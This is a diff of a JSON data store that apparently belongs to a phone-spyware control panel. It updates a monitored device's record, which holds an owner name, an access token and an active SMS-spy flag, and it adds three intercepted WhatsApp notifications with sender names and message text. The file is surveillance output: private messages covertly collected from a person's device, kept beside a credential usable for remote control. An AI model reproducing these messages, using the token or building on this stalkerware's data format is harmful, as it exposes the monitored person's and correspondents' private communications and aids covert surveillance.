@@ -4,7 +4,7 @@
     "deviceName": "HP-SANGEAN-6B64",
     "ownerUsername": "KUDANIL",
     "token": "3020da2f0f6d9f81513d32cd8944bd59",
-    "lastSeen": 1775229104604,
+    "lastSeen": 1775229108252,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-02T14:28:53.779Z",
@@ -7703,6 +7703,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "capel",
+        "content": "‎17 pesan baru",
+        "time": "03/04 22:11",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775229108298
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎capel (16 pesan): putune imen",
+        "content": "nek caper aja Nang kene la",
+        "time": "03/04 22:11",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775229106808
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "capel",
+        "content": "‎16 pesan baru",
+        "time": "03/04 22:11",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775229106794
+      },
       {
         "appName": "WhatsApp",
         "sender": "capel",
